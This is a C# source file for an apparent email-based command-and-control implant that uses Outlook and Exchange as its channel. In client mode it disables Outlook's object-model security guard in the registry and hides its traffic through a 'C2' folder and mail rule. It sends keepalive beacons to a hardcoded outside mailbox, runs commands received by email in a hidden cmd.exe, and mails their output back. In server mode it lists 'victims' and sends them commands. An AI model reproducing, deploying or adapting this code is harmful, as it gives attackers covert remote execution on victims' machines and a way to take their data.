using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Threading;
using Outlook = Microsoft.Office.Interop.Outlook;
using System.Diagnostics;
using Microsoft.Win32;

namespace ExchangeExample
{
    public class Program
    {
        public const int HKLM_LEN = 19;
        public static Outlook.NameSpace outlookNameSpace;
        public static Outlook.MAPIFolder inbox;
        public static Outlook.Items items;
        public static string[] keys =
        {
            @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\ClickToRun\REGISTRY\MACHINE\Software\Wow6432Node\Microsoft\Office\16.0\Outlook\Security",
            @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\ClickToRun\REGISTRY\MACHINE\Software\Microsoft\Office\16.0\Outlook\Security",
            @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\ClickToRun\REGISTRY\MACHINE\Software\Microsoft\Office\16.0\Outlook\Security",
            @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\16.0\Outlook\Security"
        };

        public static void SetRegistry()
        {

            foreach (var key in keys)
            {
                Registry.LocalMachine.CreateSubKey(key.Remove(0, HKLM_LEN));
                Registry.SetValue(key, "ObjectModelGuard", 2);
            }
        }
        public static string ExecuteCommand(string command)
        {

            Process process = new Process();
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/C " + command;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardInput = true;
            process.Start();
            string q = "";
            while (!process.HasExited)
            {
                q += process.StandardOutput.ReadToEnd();
            }

            return q;
        }
        public static void SendEmailFromAccount(Outlook.Application application, string subject, string body, string recipient)
        {

            // Create a new MailItem and set the To, Subject, and Body properties. 
            Outlook.MailItem newMail = (Outlook.MailItem)application.CreateItem(Outlook.OlItemType.olMailItem);

            // Set recipient
            newMail.To = recipient;

            // Set subject
            newMail.Subject = subject;
            newMail.Body = body;
            //newMail.DeleteAfterSubmit = true;
            newMail.Send();
        }
        public static void SendEmailFromAccount(Outlook.Application application, string subject, string body, List<string> recipients)
        {

            // Create a new MailItem and set the To, Subject, and Body properties. 
            Outlook.MailItem newMail = (Outlook.MailItem)application.CreateItem(Outlook.OlItemType.olMailItem);
            string to = "";
            if (recipients.Count > 1)
            {
                // Concat all recipients using ; to have multiple recipients
                foreach (var recipient in recipients)
                    to += recipient + "; ";

                // Remove trailing ; and set recipients
                newMail.To = to.Substring(0, to.Length - 2);
            }

            // Set subject
            newMail.Subject = subject;

            // Set body
            newMail.Body = body;
            //newMail.DeleteAfterSubmit = true;
            newMail.Send();

        }
        public static Outlook.Application OutlookApplication = null;
        public const string C2_MAIL = "u8885555@bsmch.net";
        public static List<String> victims = new List<string>();

        public static void KeepAlive()
        {
            while (true)
            {
                SendEmailFromAccount(OutlookApplication, "C2", "KeepAlive", C2_MAIL);
                Thread.Sleep(5 * 1000 * 60);
            }
        }
        public static void StartOutlook() { Process.Start("outlook.exe"); }
        public static void Main(string[] args)
        {
            Process[] processes = Process.GetProcessesByName("outlook");
            SetRegistry();
            if (processes.Length > 0)
            {
                foreach (var item in processes)
                {
                    item.Kill();
                }
            }
            //Process.Start("outlook.exe");
            Thread t2 = new Thread(StartOutlook);
            t2.Start();
            Thread.Sleep(20000);
            try
            {
                OutlookApplication = Marshal.GetActiveObject("Outlook.Application") as Outlook.Application;
            }
            catch (Exception)
            {
                Thread.Sleep(10000);
                OutlookApplication = Marshal.GetActiveObject("Outlook.Application") as Outlook.Application;
                //throw;
            }
            

            // Connect to the user's open MAPI session
            outlookNameSpace = OutlookApplication.GetNamespace("MAPI");

            




            // Get inbox
            inbox = outlookNameSpace.GetDefaultFolder(
                    Microsoft.Office.Interop.Outlook.
                    OlDefaultFolders.olFolderInbox);
            Outlook.MAPIFolder root = inbox.Parent;
            
            Outlook.MAPIFolder c2 = null;
            foreach (Outlook.MAPIFolder folder in root.Folders)
            {
                if (folder.Name == "C2")
                {
                    c2 = folder;
                    break;
                }
            }
            if (c2==null)
            {
                c2 = root.Folders.Add("C2");
            }

            items = c2.Items;

            Outlook.Rules rules = OutlookApplication.Session.DefaultStore.GetRules();
            bool exists = false;
            foreach (Outlook.Rule rule in rules)
            {
                if (rule.Name == "C2")
                {
                    exists = true;
                    break;
                }
            }

            // Rules
            if (!exists)
            {

                // Crete Rule
                Outlook.Rule rule = rules.Create("C2", Outlook.OlRuleType.olRuleReceive);
                rule.Conditions.Subject.Text = new string[] { "C2" };
                rule.Conditions.Subject.Enabled = true;
                rule.Actions.MoveToFolder.Folder = c2;
                rule.Actions.MoveToFolder.Enabled = true;

                rule.Enabled = true;
                rules.Save(true);
            }



            if (args.Length != 1)
            {
                Console.WriteLine("Please enter arg server/client");
            }
            if (args[0] == "server")
            {
                // Create server function callback
                items.ItemAdd +=
                    new Outlook.ItemsEvents_ItemAddEventHandler(Server_Callback);
                Console.WriteLine("[!] Waiting for new messages:\n=============================");
                while (true)
                {
                    Console.WriteLine("Choose what to do (print/command):");
                    string opt = Console.ReadLine();
                    switch (opt.ToLower().Trim().Split(' ').First())
                    {
                        case "print":
                            {
                                Console.WriteLine("Getting victims:");
                                foreach (var victim in victims)
                                {
                                    Console.WriteLine("[*] {0}", victim);
                                }
                                break;
                            }
                        case "command":
                            {
                                Console.WriteLine("Enter Commnand:");
                                string com = Console.ReadLine();
                                if (victims.Count > 1)

                                    // Send command mail to victim
                                    SendEmailFromAccount(OutlookApplication, "C2", "command " + com, victims);
                                else
                                {

                                    // Send command mail to victims
                                    if (victims.Count == 1)
                                        SendEmailFromAccount(OutlookApplication, "C2", "command " + com, victims[0]);
                                    
                                    else
                                        Console.WriteLine("No victims found");
                                }
                                break;
                            }
                        default:
                            break;
                    }
                }
            }
            if (args[0] == "client")
            {
                // Create Thead to announce that agent is alive
                Thread t = new Thread(KeepAlive);
                t.Start();

                // Create client function callback
                items.ItemAdd +=
                    new Outlook.ItemsEvents_ItemAddEventHandler(Client_Callback);
                while (true)
                {
                    Thread.Sleep(100000000);
                }
            }
        }

        public static void Server_Callback(object Item)
        {
            string filter = "C2";
            Outlook.MailItem mail = (Outlook.MailItem)Item;
            if (Item != null)
            {
                if (mail.Subject.ToUpper().Contains(filter.ToUpper()))
                {
                    if (mail.Body.Contains("KeepAlive") && !victims.Contains(mail.Sender.GetExchangeUser().PrimarySmtpAddress))
                        victims.Add(mail.Sender.GetExchangeUser().PrimarySmtpAddress);
                    else
                        Console.WriteLine("New Message from: {0}\tMessage:\n{1}", mail.Sender.GetExchangeUser().PrimarySmtpAddress, mail.Body.Trim());
                    mail.Delete();
                }
            }
        }

        public static void Client_Callback(object Item)
        {
            string filter = "C2";
            Outlook.MailItem mail = (Outlook.MailItem)Item;
            if (Item != null)
            {
                if (mail.Subject.ToUpper().Contains(filter.ToUpper()))
                {
                    switch (mail.Body.Trim().Split(' ').Skip(0).FirstOrDefault())
                    {
                        case "command":
                            {
                                var secondWord = mail.Body.Split(' ').Skip(1).FirstOrDefault();
                                string command = ExecuteCommand(secondWord);
                                SendEmailFromAccount(OutlookApplication, "C2", command, C2_MAIL);
                                break;
                            }
                        default:
                            break;
                    }
                    mail.Delete();
                }
            }

        }
    }
}
